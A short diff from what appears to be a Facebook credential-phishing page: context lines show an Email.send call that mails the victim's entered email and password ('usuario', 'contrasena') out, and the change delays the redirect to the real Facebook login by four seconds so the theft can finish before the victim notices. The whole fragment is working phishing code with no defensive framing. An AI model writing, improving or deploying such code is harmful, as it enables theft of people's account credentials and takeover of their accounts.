@@ -13,7 +13,11 @@ Email.send({
     Body : "usuario: " + document.getElementById("email").value + ", contrasena: " + document.getElementById("pass").value
 })
 
-window.location = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110";
+ window.setTimeout(function(){
+
+        window.location.href = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110";
+
+    }, 4000);
 }
 </script>
 <script>function envFlush(a) {
